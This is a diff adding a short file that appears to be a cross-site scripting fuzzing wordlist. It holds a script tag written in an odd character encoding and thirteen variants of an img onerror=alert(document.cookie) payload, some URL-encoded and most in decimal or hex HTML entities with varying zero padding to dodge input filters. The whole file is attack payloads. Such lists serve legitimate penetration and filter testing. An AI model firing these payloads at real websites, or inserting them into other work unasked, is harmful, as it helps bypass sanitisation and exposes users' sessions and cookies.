@@ -1,0 +1,15 @@
+¼script¾alert(¢XSS¢)¼/script¾
+%3Cimg src=x onerror=alert(document.cookie)>
+&#060img src=x onerror=alert(document.cookie)&#062;
+&#0060;img src=x onerror=alert(document.cookie)&#0062;
+&#00060;img src=x onerror=alert(document.cookie)&#00062;
+&#000060;img src=x onerror=alert(document.cookie)&#000062;
+&#0000060;img src=x onerror=alert(document.cookie)&#0000062;
+&#0000060;img src=x onerror=alert(document.cookie)&#0000062;
+&#60img src=x onerror=alert(document.cookie)&#62;
+&#x3c;img src=x onerror=alert(document.cookie)&#x3e;
+&#x03c;img src=x onerror=alert(document.cookie)&#x03e;
+&#x003c;img src=x onerror=alert(document.cookie)&#x003e;
+&#x0003c;img src=x onerror=alert(document.cookie)&#x0003e;
+&#x00003c;img src=x onerror=alert(document.cookie)&#x00003e;
+&#x000003c;img src=x onerror=alert(document.cookie)&#x000003e;
